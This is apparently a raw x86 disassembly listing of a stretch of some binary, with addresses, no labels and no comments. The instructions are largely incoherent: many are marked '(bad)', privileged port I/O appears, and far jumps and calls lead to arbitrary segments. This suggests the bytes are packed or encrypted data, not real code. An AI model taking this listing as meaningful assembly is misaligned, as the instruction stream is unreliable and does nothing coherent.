  41aa31:	and    bl,BYTE PTR [eax-0x5f]
  41aa34:	mov    al,0x2c
  41aa36:	nop
  41aa37:	dec    ecx
  41aa38:	cld    
  41aa39:	jp     0x41aa75
  41aa3b:	xor    edx,DWORD PTR [esi+edi*4+0x1e96fc2d]
  41aa42:	add    DWORD PTR [ebp-0x398083e5],ebx
  41aa48:	leave  
  41aa49:	jbe    0x41aaad
  41aa4b:	jns    0x41aa24
  41aa4d:	retf   
  41aa4e:	inc    edx
  41aa4f:	pop    esp
  41aa50:	or     DWORD PTR [edi-0x346b84ff],esp
  41aa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa57:	mov    ecx,0xa614550f
  41aa5c:	loopne 0x41aa13
  41aa5e:	les    edx,FWORD PTR [esp+ebp*2+0x27]
  41aa62:	test   al,0xe9
  41aa64:	push   eax
  41aa65:	icebp  
  41aa66:	lods   al,BYTE PTR ds:[esi]
  41aa67:	xchg   edi,eax
  41aa68:	arpl   cx,cx
  41aa6a:	ret    
  41aa6b:	call   0x1736:0xfc87b7ab
  41aa72:	xor    DWORD PTR [ebp-0x6a],esp
  41aa75:	daa    
  41aa76:	pop    ebx
  41aa77:	or     cl,0x1e
  41aa7a:	cmp    cl,BYTE PTR es:[edi+edi*2+0x6b]
  41aa7f:	fnsave [ebx+0x491bca4]
  41aa85:	out    0x12,eax
  41aa87:	(bad)  
  41aa89:	and    DWORD PTR [ebx+0x531d0cd5],0x6adedb86
  41aa93:	loope  0x41aa74
  41aa95:	jp     0x41aafd
  41aa97:	mov    ecx,0xa4d230b7
  41aa9c:	add    edi,DWORD PTR [ebx+0x590bdc11]
  41aaa2:	lea    edx,[eax+ebx*1+0xc5ef4a9]
  41aaa9:	jp     0x41aac5
  41aaab:	jb     0x41aad6
  41aaad:	push   eax
  41aaae:	cwde   
  41aaaf:	loope  0x41aaa8
  41aab1:	iret   
  41aab2:	mov    ch,0x2c
  41aab4:	xor    eax,DWORD PTR [edi+0x1e]
  41aab7:	mov    al,0xad
  41aab9:	(bad)  
  41aabb:	add    cl,BYTE PTR [ebx-0x931bffa]
  41aac1:	dec    esi
  41aac2:	sbb    bh,BYTE PTR fs:[edx]
  41aac5:	mov    ah,0xe
  41aac7:	adc    edx,ebx
  41aac9:	push   edi
  41aaca:	inc    ecx
  41aacb:	jo     0x41aa83
  41aacd:	icebp  
  41aace:	jle    0x41ab12
  41aad0:	mov    ebp,0x1d317b7c
  41aad5:	pop    esi
  41aad6:	add    eax,0x8579b0f3
  41aadb:	popf   
  41aadc:	imul   esp,DWORD PTR [ebp-0x585f4e37],0x263700e2
  41aae6:	mov    edx,0xb39144d8
  41aaeb:	cmp    eax,0xa756eb19
  41aaf0:	mov    esi,0x7cee8215
  41aaf5:	or     DWORD PTR [ecx+0x5e],ecx
  41aaf8:	jbe    0x41ab42
  41aafa:	mov    dl,0xb3
  41aafc:	xchg   ebp,eax
  41aafd:	adc    ecx,esi
  41aaff:	push   eax
  41ab00:	sbb    ah,BYTE PTR [edi-0x32573be3]
  41ab06:	cmp    eax,0x4f2a0282
  41ab0b:	xchg   edi,eax
  41ab0c:	mov    edi,0x4741646f
  41ab11:	push   esi
  41ab12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab13:	push   es
  41ab14:	(bad)  
  41ab15:	dec    esp
  41ab16:	lods   eax,DWORD PTR ds:[esi]
  41ab17:	fwait
  41ab18:	rcl    BYTE PTR [esi+0xf],1
  41ab1b:	scas   al,BYTE PTR es:[edi]
  41ab1c:	repz push eax
  41ab1e:	or     al,0x5
  41ab20:	jnp    0x41ab54
  41ab22:	mov    bh,0x72
  41ab24:	xchg   edi,esp
  41ab26:	xor    eax,0x9e1a6e31
  41ab2b:	in     eax,dx
  41ab2c:	cmp    al,BYTE PTR [ebx]
  41ab2e:	xchg   ebp,eax
  41ab2f:	dec    ecx
  41ab30:	sub    al,0x39
  41ab32:	in     eax,0xcb
  41ab34:	ja     0x41ab21
  41ab36:	sub    eax,0x4159af1c
  41ab3b:	imul   ecx,DWORD PTR [edx+0xe],0x45
  41ab3f:	cmp    al,0x1c
  41ab41:	pop    edx
  41ab42:	add    ecx,esi
  41ab44:	popa   
  41ab45:	clc    
  41ab46:	repz in al,dx
  41ab48:	xchg   esp,eax
  41ab49:	(bad)  
  41ab4b:	imul   edi,DWORD PTR [ebx-0x4ab0ccbf],0x6b665fd4
  41ab55:	xchg   ecx,eax
  41ab56:	xchg   esp,eax
  41ab57:	mov    ds:0x5889d548,al
  41ab5c:	xchg   DWORD PTR ds:0xacf634f6,esp
  41ab62:	retf   
  41ab63:	cmp    ch,BYTE PTR [eax-0xd6e9503]
  41ab69:	stos   DWORD PTR es:[edi],eax
  41ab6a:	int3   
  41ab6b:	idiv   DWORD PTR [ecx-0x3ad84241]
  41ab71:	jbe    0x41abb4
  41ab73:	(bad)  
  41ab74:	sub    DWORD PTR [esi],esi
  41ab76:	ror    DWORD PTR [eax],cl
  41ab78:	mov    ds:0xebbe31bc,al
  41ab7d:	lds    ebx,FWORD PTR [ebx-0x5c]
  41ab80:	mov    ebx,0xa8ff4f4
  41ab85:	jecxz  0x41ab17
  41ab87:	inc    esp
  41ab88:	add    al,0x3e
  41ab8a:	xor    eax,esp
  41ab8c:	cmp    al,cl
  41ab8e:	mov    edx,0x85a4ab79
  41ab93:	repz jno 0x41ab3f
  41ab96:	loop   0x41abf0
  41ab98:	ds pop edx
  41ab9a:	lock adc ecx,edx
  41ab9d:	xchg   edi,eax
  41ab9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab9f:	loop   0x41ab2c
  41aba1:	les    eax,FWORD PTR [ebx+0x53686fc0]
  41aba7:	mov    cl,0x3e
  41aba9:	sbb    al,0x17
  41abab:	inc    esi
  41abac:	jnp    0x41abd0
  41abae:	xor    ecx,DWORD PTR [esi+0x4a]
  41abb1:	lock push 0x46
  41abb4:	xchg   ebp,eax
  41abb5:	retf   
  41abb6:	push   cs
  41abb7:	jmp    0x2ac2:0x7b13fda5
  41abbe:	mov    al,0x4d
  41abc0:	push   ebx
  41abc1:	pop    eax
  41abc2:	pop    eax
  41abc3:	dec    ebx
  41abc4:	imul   ebp,DWORD PTR [ebx+0x52],0x7cb9bd4d
  41abcb:	test   DWORD PTR [edx-0x3003ebb1],0x9345f53
  41abd5:	sbb    ch,BYTE PTR [ecx-0x21e48cff]
  41abdb:	push   eax
  41abdc:	mov    ecx,0x37a53e80
  41abe1:	mov    dh,0xe0
  41abe3:	(bad)  
  41abe4:	outs   dx,DWORD PTR ds:[esi]
  41abe5:	arpl   WORD PTR [ecx+0x4a],sp
  41abe8:	push   ds
  41abe9:	fnstcw WORD PTR [ebp-0x50]
  41abec:	(bad)  
  41abee:	xor    cl,BYTE PTR [edx]
  41abf0:	dec    eax
  41abf1:	cmp    DWORD PTR [esi-0x57],esp
  41abf4:	inc    ebx
  41abf5:	and    al,0xce
  41abf7:	push   ecx
  41abf8:	jo     0x41ab83
  41abfa:	neg    BYTE PTR [ecx]
  41abfc:	pushf  
  41abfd:	and    eax,0x622d110
  41ac02:	dec    esi
  41ac03:	and    edx,0x6848bc2e
  41ac09:	mov    ebx,0x309b6d57
  41ac0e:	popf   
  41ac0f:	(bad)  
  41ac10:	aam    0x57
  41ac12:	cdq    
  41ac13:	je     0x41ac74
  41ac15:	sbb    bl,BYTE PTR [eax+0x73]
  41ac18:	jnp    0x41ac20
  41ac1a:	mov    ecx,0x857e6022
  41ac1f:	sub    al,0xa2
  41ac21:	sbb    eax,0xa7498300
  41ac26:	jg     0x41ac93
  41ac28:	jnp    0x41ac33
  41ac2a:	xchg   ebx,eax
  41ac2b:	mov    dh,0x0
  41ac2d:	xor    DWORD PTR [esi-0x69],0x929eb245
  41ac34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac35:	jge    0x41ac3a
  41ac37:	dec    edi
  41ac38:	sub    al,0xa0
  41ac3a:	push   edi
  41ac3b:	add    eax,0x703d0f2d
  41ac40:	sub    BYTE PTR [edi],ah
  41ac42:	je     0x41ac49
  41ac44:	cmp    bh,BYTE PTR [edx+ecx*1]
  41ac47:	cmc    
  41ac48:	addr16 dec esp
  41ac4a:	jmp    0xbbbaa02a
  41ac4f:	dec    esp
  41ac50:	call   0x48af:0x998bdf52
  41ac57:	mov    ebx,0x7933a0d7
  41ac5c:	adc    DWORD PTR [esi-0x698ba71a],0x15
  41ac63:	inc    esi
  41ac64:	or     eax,0xe43426c4
  41ac69:	inc    esi
  41ac6a:	call   0x96a9:0xcc418815
  41ac71:	sub    eax,0x8c5a215c
  41ac76:	cli    
  41ac77:	lods   eax,DWORD PTR ds:[esi]
  41ac78:	inc    edi
  41ac79:	fidivr WORD PTR [edx+0x15]
  41ac7c:	shl    DWORD PTR [esi+ecx*1+0x3e],1
  41ac80:	aas    
  41ac81:	dec    bl
  41ac83:	repz and DWORD PTR [esi+0x261c8f3],ebp
  41ac8a:	dec    eax
  41ac8b:	cs adc eax,ebx
  41ac8e:	ins    BYTE PTR es:[edi],dx
  41ac8f:	mov    ds:0x1f2f3395,al
  41ac94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac95:	lea    eax,[edi-0x69]
  41ac98:	mov    al,0x8b
  41ac9a:	inc    ebx
  41ac9b:	add    esp,DWORD PTR [ebx]
  41ac9d:	or     DWORD PTR [eax],edx
  41ac9f:	int    0x22
  41aca1:	ins    BYTE PTR es:[edi],dx
  41aca2:	aaa    
  41aca3:	and    BYTE PTR [esi],0x19
  41aca6:	jno    0x41ac44
  41aca8:	jbe    0x41ace0
  41acaa:	or     esp,DWORD PTR [ebp*2+0x4179676c]
  41acb1:	jmp    0x41ac6b
  41acb3:	fsubp  st(5),st
  41acb5:	repnz icebp 
  41acb7:	mov    bh,0x7c
  41acb9:	push   0x9272231f
  41acbe:	ret    
  41acbf:	xlat   BYTE PTR gs:[ebx]
  41acc1:	mov    dl,0xcb
  41acc3:	adc    DWORD PTR [edi+0x4cd4df89],esp
  41acc9:	push   edx
  41acca:	leave  
  41accb:	lods   eax,DWORD PTR ds:[esi]
  41accc:	mov    ds:0x7fed262a,al
  41acd1:	xchg   BYTE PTR [eax],ch
  41acd3:	out    dx,al
  41acd4:	mov    esi,0xc248691a
  41acd9:	pop    ds
  41acda:	push   eax
  41acdb:	shr    DWORD PTR [ebp-0x3a094757],cl
  41ace1:	ss data16 mov bh,0x7e
  41ace5:	xchg   esp,eax
  41ace6:	ins    BYTE PTR es:[edi],dx
  41ace7:	inc    edx
  41ace8:	not    BYTE PTR ss:[edi-0x1d]
  41acec:	outs   dx,DWORD PTR ds:[esi]
  41aced:	pop    eax
  41acee:	lds    ecx,FWORD PTR [ebx]
  41acf0:	fcmovbe st,st(0)
  41acf2:	push   edx
  41acf4:	or     bl,BYTE PTR [esi+0x62]
  41acf7:	or     edi,esp
  41acf9:	jbe    0x41ad61
  41acfb:	sahf   
  41acfc:	and    ebp,esp
  41acfe:	sub    eax,0x576cd9dc
  41ad03:	lods   al,BYTE PTR ds:[esi]
  41ad04:	fmul   DWORD PTR fs:[ebp+0x1f97007]
  41ad0b:	into   
  41ad0c:	fwait
  41ad0d:	repz mov dl,BYTE PTR [eax-0x66ea93e0]
  41ad14:	add    bl,BYTE PTR [eax+ebx*4-0x6d]
  41ad18:	(bad)  
  41ad19:	and    eax,0x880aa0c5
  41ad1e:	enter  0x4d21,0x56
  41ad22:	pop    eax
  41ad23:	and    eax,0xc0db13ac
  41ad28:	mov    bh,0xec
  41ad2a:	push   edi
  41ad2b:	xor    eax,DWORD PTR [ebp+0x412a32c6]
  41ad31:	dec    edi
  41ad32:	add    al,bl
  41ad34:	(bad)  
  41ad35:	xchg   edi,eax
  41ad36:	xor    al,0xae
  41ad38:	ins    BYTE PTR es:[edi],dx
  41ad39:	pop    ecx
  41ad3a:	lahf   
  41ad3b:	adc    esi,DWORD PTR [esi-0x38c94910]
  41ad41:	inc    esp
  41ad42:	jbe    0x41ad5d
  41ad44:	rcl    DWORD PTR [edx-0x36487bad],0x15
  41ad4b:	cmp    al,dl
  41ad4d:	out    0x91,al
  41ad4f:	outs   dx,BYTE PTR ds:[esi]
  41ad50:	gs xor al,0xc2
  41ad53:	mov    ebx,0x6c4a74b
  41ad58:	pop    ds
  41ad59:	jno    0x41ad49
  41ad5b:	fistp  DWORD PTR [ebp+0x49]
  41ad5e:	or     edi,DWORD PTR [edx-0x9]
  41ad61:	pop    esp
  41ad62:	inc    ebx
  41ad63:	stos   BYTE PTR es:[edi],al
  41ad64:	and    ah,BYTE PTR [ebp+eax*2+0x1993d5d4]
  41ad6b:	xchg   ecx,eax
  41ad6c:	mov    edi,0x64d19df0
  41ad71:	stos   DWORD PTR es:[edi],eax
  41ad72:	mov    BYTE PTR ds:0x75a45a61,0x63
  41ad79:	retf   0x32c6
  41ad7c:	xchg   ecx,eax
  41ad7d:	ret    0x9edf
  41ad80:	mov    eax,ds:0x7326e704
  41ad85:	pop    ss
  41ad86:	not    esp
  41ad88:	xchg   ebp,eax
  41ad89:	call   0xa42d:0x3a45292
  41ad90:	repz cld 
  41ad92:	push   ds
  41ad93:	jp     0x41add0
  41ad95:	pop    ss
  41ad96:	jmp    0x7fb5d373
  41ad9b:	push   esi
  41ad9c:	or     al,0xa9
  41ad9e:	mov    WORD PTR [edx-0x9c366ce],?
  41ada4:	rcr    BYTE PTR [ebp+ebx*4+0x78],1
  41ada8:	stos   BYTE PTR es:[edi],al
  41ada9:	stos   DWORD PTR es:[edi],eax
  41adaa:	enter  0x52cf,0x4f
  41adae:	scas   al,BYTE PTR es:[edi]
  41adaf:	add    bh,BYTE PTR [ebx+ecx*4+0x1e]
  41adb3:	jnp    0x41adaf
  41adb5:	(bad)  
  41adb6:	or     eax,edi
  41adb8:	or     al,0x74
  41adba:	ja     0x41ade9
  41adbc:	add    esi,ebp
  41adbe:	cli    
  41adbf:	dec    eax
  41adc0:	or     ch,bh
  41adc2:	test   BYTE PTR [edx+0x636d9730],cl
  41adc8:	jno    0x41ad70
  41adca:	(bad)  
  41adcb:	(bad)  
  41adce:	ror    al,cl
  41add0:	pop    esi
  41add1:	dec    esp
  41add2:	pop    edx
  41add3:	xchg   BYTE PTR [edi],dl
  41add5:	mov    al,ds:0x72a0de1a
  41adda:	pop    esi
  41addb:	jo     0x41adeb
  41addd:	jne    0x41adf6
  41addf:	call   0x29edf0ed
  41ade4:	sbb    DWORD PTR [ebx+esi*1-0x39562244],edx
  41adeb:	xchg   esp,eax
  41adec:	push   0x747ad8a1
  41adf1:	xor    eax,0x94950e20
  41adf6:	adc    al,BYTE PTR [edx]
  41adf8:	mov    dh,0x8
  41adfa:	xchg   DWORD PTR [ebp-0xa],eax
  41adfd:	daa    
  41adfe:	pop    es
  41adff:	dec    esp
  41ae00:	(bad)  [ebx+0x7a]
  41ae03:	jp     0x41ae80
  41ae05:	pop    ecx
  41ae06:	add    DWORD PTR [esi],esi
  41ae08:	xchg   BYTE PTR [esi+0x760a5fac],cl
  41ae0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae0f:	sub    eax,0x3544270b
  41ae14:	add    bh,bl
  41ae16:	ss mov ebp,0x4639e343
  41ae1c:	sub    esi,DWORD PTR [esi-0x5]
  41ae1f:	pop    ds
  41ae20:	stc    
  41ae21:	fmulp  st(2),st
  41ae23:	jo     0x41ae3b
  41ae25:	retf   0xedf8
  41ae28:	cdq    
  41ae29:	mov    bh,0x97
  41ae2b:	inc    ebx
  41ae2c:	mov    ecx,0xbd3484f3
  41ae31:	or     eax,edi
  41ae33:	xlat   BYTE PTR ds:[ebx]
  41ae34:	jg     0x41adbb
  41ae36:	mov    BYTE PTR [edx+0x56],dl
  41ae39:	outs   dx,BYTE PTR ds:[esi]
  41ae3a:	lock daa 
  41ae3c:	inc    ebp
  41ae3d:	mov    DWORD PTR [eax-0x13337c3a],0xa1483636
  41ae47:	xor    ah,ch
  41ae49:	push   edx
  41ae4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4c:	xchg   ebp,eax
  41ae4d:	out    0xb8,al
  41ae4f:	dec    ebx
  41ae50:	retf   0xef29
  41ae53:	popa   
  41ae54:	into   
  41ae55:	out    0xa6,al
  41ae57:	lods   al,BYTE PTR ds:[esi]
  41ae58:	push   ds
  41ae59:	mov    WORD PTR [esi-0x3e5870b2],?
  41ae5f:	pop    edx
  41ae60:	in     eax,dx
  41ae61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae62:	jns    0x41ae4b
  41ae64:	fsub   DWORD PTR [ecx+0x2e]
  41ae67:	aam    0x97
  41ae69:	sbb    edi,ebp
  41ae6b:	cmp    eax,0x10e14bda
  41ae70:	daa    
  41ae71:	cdq    
  41ae72:	aas    
  41ae73:	aam    0x56
  41ae75:	sar    BYTE PTR [edi-0x6051b409],cl
  41ae7b:	jl     0x41ae99
  41ae7d:	aad    0xac
  41ae7f:	xchg   ebp,eax
  41ae80:	xchg   edx,eax
  41ae81:	or     eax,0x1258e5de
  41ae86:	or     edi,DWORD PTR [esi+0x7c0506fc]
  41ae8c:	xchg   ecx,eax
  41ae8d:	loopne 0x41aebe
  41ae8f:	mov    ebx,0x76b4bc2d
  41ae94:	pop    edx
  41ae95:	daa    
  41ae96:	xchg   ecx,eax
  41ae97:	jae    0x41af0a
  41ae99:	loopne 0x41aeb7
  41ae9b:	lods   eax,DWORD PTR ds:[esi]
  41ae9c:	arpl   WORD PTR [edi-0x5bc76070],cx
  41aea2:	mov    ds:0x4a744bd6,eax
  41aea7:	add    al,0x2b
  41aea9:	adc    edx,DWORD PTR [ecx]
  41aeab:	rol    BYTE PTR es:[ecx+ecx*2-0x11],cl
  41aeb0:	xchg   DWORD PTR [edx],ebx
  41aeb2:	mov    gs,WORD PTR [ecx+0x26]
  41aeb5:	inc    ebx
  41aeb6:	add    al,0x8b
  41aeb8:	mov    bl,cl
  41aeba:	fcomp  QWORD PTR [esi]
  41aebc:	dec    esi
  41aebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aebe:	das    
  41aebf:	nop
  41aec0:	iret   
  41aec1:	jo     0x41ae58
  41aec3:	(bad)  
  41aec4:	shl    BYTE PTR [ebp+0x44421607],cl
  41aeca:	stos   DWORD PTR es:[edi],eax
  41aecb:	icebp  
  41aecc:	jmp    0x41af2b
  41aece:	inc    eax
  41aecf:	cmp    ah,dl
  41aed1:	adc    eax,0xb2983cc7
  41aed6:	sub    DWORD PTR [ebx],esp
  41aed8:	push   ebp
  41aed9:	ja     0x41af5a
  41aedb:	and    ch,al
  41aedd:	test   eax,0x4b37ce3c
  41aee2:	imul   eax,esi,0xd93f251e
  41aee8:	add    DWORD PTR cs:[ebx-0x1],esi
  41aeec:	adc    bh,bh
  41aeee:	lock mov ah,0xd1
  41aef1:	and    BYTE PTR [ecx+0x15],al
  41aef4:	sub    bl,al
  41aef6:	(bad)  
  41aef7:	mov    al,0xfc
  41aef9:	sub    al,BYTE PTR [edx]
  41aefb:	cmp    al,0xec
  41aefd:	xor    al,0xdf
  41aeff:	fistp  WORD PTR [eax+0x2f]
  41af02:	mov    ch,0xf8
  41af04:	nop
  41af05:	push   esi
  41af06:	stos   BYTE PTR es:[edi],al
  41af07:	jecxz  0x41af4a
  41af09:	or     al,dl
  41af0b:	jmp    0x7857bd5a
  41af10:	push   edi
  41af11:	push   ecx
  41af12:	jb     0x41aeca
  41af14:	xchg   esi,eax
  41af15:	es iret 
  41af17:	int    0x11
  41af19:	adc    eax,0x9febeddb
  41af1e:	or     BYTE PTR ds:0x5bb4eeac,dl
  41af24:	fstp   DWORD PTR [esi+0x4c67aeab]
  41af2a:	xchg   ebx,eax
  41af2b:	inc    ecx
  41af2c:	mov    bl,0x6f
  41af2e:	push   eax
  41af2f:	sub    ecx,DWORD PTR [ebx+ecx*4-0x75]
  41af33:	retf   0x3fc2
  41af36:	mov    ebx,0x2b3803ea
  41af3b:	cmc    
  41af3c:	add    BYTE PTR [edx],ch
  41af3e:	fisub  WORD PTR [ecx]
  41af40:	imul   eax,DWORD PTR [edi],0xd789ff08
  41af46:	test   ah,bl
  41af48:	or     al,0x18
  41af4a:	sbb    DWORD PTR [eax],ebx
  41af4c:	cs jbe 0x41afbf
  41af4f:	ins    DWORD PTR es:[edi],dx
  41af50:	mov    esp,edx
  41af52:	or     DWORD PTR [edx-0x2a],edi
  41af55:	popf   
  41af56:	mov    ah,0xc4
  41af58:	mov    cl,0x30
  41af5a:	add    esp,eax
  41af5c:	repnz add al,BYTE PTR [ebp-0x65c2f458]
  41af63:	pop    edi
  41af64:	js     0x41aef0
  41af66:	jnp    0x41afcf
  41af68:	pop    ebx
  41af69:	xor    al,0x78
  41af6b:	jae    0x41af86
  41af6d:	mov    ecx,0xeb85fe56
  41af72:	mov    edi,0x1a4fc8a3
  41af77:	dec    esp
  41af78:	out    dx,eax
  41af79:	mov    edi,0x9cbc1732
  41af7e:	adc    BYTE PTR [ebx+0x24],bl
  41af81:	inc    esp
  41af82:	push   ecx
  41af83:	mov    ds:0x9852907,eax
  41af88:	imul   edi,DWORD PTR [ecx+0xf],0x370f06c
  41af8f:	cli    
  41af90:	xor    eax,0x276bdcfc
  41af95:	mov    BYTE PTR [edx*1-0x5b130c41],ah
  41af9c:	push   cs
  41af9d:	mov    ebx,DWORD PTR [ebp+0x6e]
  41afa0:	cmp    eax,edx
  41afa2:	jo     0x41afa4
  41afa4:	sahf   
  41afa5:	and    ebp,eax
  41afa7:	call   0x9630ff23
  41afac:	data16 repnz sti 
  41afaf:	and    al,0xa9
  41afb1:	rcpps  xmm2,xmm1
  41afb4:	pop    ebp
  41afb5:	mov    cl,0xd4
  41afb7:	icebp  
  41afb8:	in     eax,dx
  41afb9:	pop    edi
  41afba:	test   eax,0x3f78a0a0
  41afbf:	pop    ebx
  41afc0:	adc    bl,al
  41afc2:	jne    0x41af53
  41afc4:	fs loop 0x41afb2
  41afc7:	mov    dh,0x8b
  41afc9:	sahf   
  41afca:	sub    DWORD PTR [ebp-0x58],ecx
  41afcd:	fsubr  QWORD PTR ds:0xfe305f05
  41afd3:	push   ds
  41afd4:	out    dx,al
  41afd5:	pop    ebx
  41afd6:	push   esi
  41afd7:	in     al,dx
  41afd8:	in     al,dx
  41afd9:	out    0xfa,al
  41afdb:	pushf  
  41afdc:	push   edi
  41afdd:	jle    0x41af7a
  41afdf:	sbb    bh,BYTE PTR [edi+0x67]
  41afe2:	(bad)  
  41afe3:	pop    esi
  41afe4:	imul   eax,DWORD PTR [ecx-0x7c],0xffffffbe
  41afe8:	loopne 0x41aff3
  41afea:	aas    
  41afeb:	mov    al,ds:0x7996a65
  41aff0:	repnz ins DWORD PTR es:[edi],dx
  41aff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aff3:	icebp  
  41aff4:	in     al,dx
  41aff5:	mov    eax,0x4cf5c3ee
  41affa:	xchg   edx,eax
  41affb:	pusha  
  41affc:	call   0xc433ea65
  41b001:	test   BYTE PTR [ebp+0x6146e1e9],al
  41b007:	and    al,0xe2
  41b009:	push   cs
  41b00a:	into   
  41b00b:	pop    edi
  41b00c:	mov    eax,0x7252039e
  41b011:	into   
  41b012:	hlt    
  41b013:	arpl   WORD PTR cs:[ecx+0x4c5910d4],ax
  41b01a:	lea    ebx,[eax-0x3e8f14d6]
  41b020:	mov    bl,0x8
  41b022:	pop    ds
  41b023:	cmp    BYTE PTR [edx-0x3cbf6017],ch
  41b029:	fisubr WORD PTR [esi]
  41b02b:	aad    0xda
  41b02d:	jmp    0x41b054
  41b02f:	aad    0x52
  41b031:	rcr    ecx,cl
  41b033:	in     eax,0xda
  41b035:	sbb    cl,cl
  41b037:	jae    0x41b043
  41b039:	sub    al,0x1f
  41b03b:	cmp    al,0x2c
  41b03d:	enter  0x4761,0x1c
  41b041:	jmp    0x19a7:0x7d22fe53
  41b048:	enter  0xd759,0xe4
  41b04c:	(bad)
  41b04f:	in     eax,0x2f
  41b051:	rcl    DWORD PTR [esi-0x1c],1
  41b054:	lds    esi,FWORD PTR [ecx-0x5a]
  41b057:	fcmove st,st(6)
  41b059:	push   esi
  41b05a:	mov    eax,ds:0x25a2eb2d
  41b05f:	mov    bh,dl
  41b061:	xchg   esp,eax
  41b062:	cmp    bh,dh
  41b064:	push   esp
  41b065:	out    dx,eax
  41b066:	mov    DWORD PTR [eax-0x4f1fe9c5],eax
  41b06c:	ret    
  41b06d:	(bad)  [edx-0x439125ae]
  41b073:	addr16 test eax,0xc4431391
  41b079:	dec    ebp
  41b07b:	scas   eax,DWORD PTR es:[edi]
  41b07c:	retf   
  41b07d:	popa   
  41b07e:	mul    DWORD PTR [ebx]
  41b080:	inc    esp
  41b081:	push   esp
  41b082:	mov    ah,ah
  41b084:	not    al
  41b086:	retf   
  41b087:	jle    0x41b024
  41b089:	mov    edx,0x34d3295e
  41b08e:	ss mov bl,0xc2
  41b091:	shl    esp,0xaa
  41b094:	or     al,0x6d
  41b096:	(bad)  
  41b097:	mov    es,WORD PTR [esi+esi*1+0x1c6e9485]
  41b09e:	ret    0x78ae
  41b0a1:	xor    eax,0xe4c2c185
  41b0a6:	pushf  
  41b0a7:	je     0x41b0ba
  41b0a9:	sbb    dl,BYTE PTR [ecx+edi*8-0x8277c75]
  41b0b0:	sub    DWORD PTR [edi],edx
  41b0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b3:	mov    bh,0x3e
  41b0b5:	pop    ds
  41b0b6:	inc    esi
  41b0b7:	(bad)  
  41b0b8:	(bad)  
  41b0b9:	stc    
  41b0ba:	fimul  DWORD PTR [edx-0x30342f2d]
  41b0c0:	pop    edx
  41b0c1:	icebp  
  41b0c2:	jge    0x41b08c
  41b0c4:	pop    ecx
  41b0c5:	sub    ch,BYTE PTR [eax]
  41b0c7:	sub    bh,bh
  41b0c9:	lock mov ds:0xce8585ce,al
  41b0cf:	cmp    eax,0xdaf38060
  41b0d4:	push   edi
  41b0d5:	outs   dx,DWORD PTR es:[esi]
  41b0d7:	dec    ebp
  41b0d8:	addr16 fwait
  41b0da:	jno    0x41b12e
  41b0dc:	stos   DWORD PTR es:[edi],eax
  41b0dd:	fild   QWORD PTR [ecx+eiz*2+0x7a]
  41b0e1:	(bad)  
  41b0e2:	ins    DWORD PTR es:[edi],dx
  41b0e3:	sbb    DWORD PTR [ecx],eax
  41b0e5:	mov    edi,0x24cec6e1
  41b0ea:	pop    ds
  41b0eb:	mov    ?,WORD PTR [edx-0x4a]
  41b0ee:	out    0x8,al
  41b0f0:	test   BYTE PTR [edi+eax*8],dl
  41b0f3:	sub    DWORD PTR [ebx-0x20c265a7],edi
  41b0f9:	popa   
  41b0fa:	fcom   QWORD PTR [edx-0x436b1060]
  41b100:	xchg   edx,eax
  41b101:	xchg   ebx,eax
  41b102:	push   edx
  41b103:	fldcw  WORD PTR [edx]
  41b105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b106:	mov    eax,0x1dd2a357
  41b10b:	test   ch,al
  41b10d:	fst    QWORD PTR [ebx-0x78]
  41b110:	shl    DWORD PTR [ebx],1
  41b112:	xor    BYTE PTR [esi],ah
  41b114:	sti    
  41b115:	sub    eax,ecx
  41b117:	mov    eax,0xd3c0123e
  41b11c:	or     dl,0xa4
  41b11f:	mov    ebx,0x68c2039f
  41b124:	outs   dx,DWORD PTR ds:[esi]
  41b125:	js     0x41b159
  41b127:	cmp    edx,eax
  41b129:	ins    DWORD PTR es:[edi],dx
  41b12a:	arpl   WORD PTR [ebp-0x26],dx
  41b12d:	mov    dh,0xdd
  41b12f:	xor    BYTE PTR [esi-0x127419bd],cl
  41b135:	push   es
  41b136:	es mov ch,0x41
  41b139:	and    ebp,DWORD PTR [edi+0x58]
  41b13c:	stos   BYTE PTR es:[edi],al
  41b13d:	push   eax
  41b13e:	cmp    al,cl
  41b140:	int3   
  41b141:	adc    eax,0xf01a1577
  41b146:	and    eax,DWORD PTR [ecx]
  41b148:	aas    
  41b149:	dec    ebx
  41b14a:	mov    dl,0x70
  41b14c:	mov    bl,0x5d
  41b14e:	lods   eax,DWORD PTR ds:[esi]
  41b14f:	imul   ebp,DWORD PTR [eax+ebx*4],0xffffff89
  41b153:	xchg   ebp,eax
  41b154:	clc    
  41b155:	popf   
  41b156:	dec    ebp
  41b157:	dec    edx
  41b158:	pop    eax
  41b159:	ret    
  41b15a:	std    
  41b15b:	dec    ebx
  41b15c:	mov    ss,WORD PTR ds:0xb7f224a
  41b162:	outs   dx,BYTE PTR ds:[esi]
  41b163:	xchg   edx,eax
  41b164:	xor    al,0x17
  41b166:	and    al,0xcf
  41b168:	sbb    al,dl
  41b16a:	leave  
  41b16b:	(bad)  
  41b16c:	cld    
  41b16d:	mov    ecx,0x277a5986
  41b172:	adc    BYTE PTR [ebp-0x2cc76821],cl
  41b178:	(bad)  
  41b179:	in     eax,0xc6
  41b17b:	cmp    al,BYTE PTR [edi+0x6]
  41b17e:	xor    al,0x43
  41b180:	pop    ebx
  41b181:	dec    ebp
  41b182:	xchg   ebp,eax
  41b183:	test   eax,0x13c1586
  41b188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b189:	xchg   ebp,eax
  41b18a:	in     al,0x0
  41b18c:	gs xchg edx,eax
  41b18e:	adc    DWORD PTR [esi-0x32],esi
  41b191:	xchg   ecx,eax
  41b192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b193:	mov    edi,0x6a16672a
  41b198:	jb     0x41b1a1
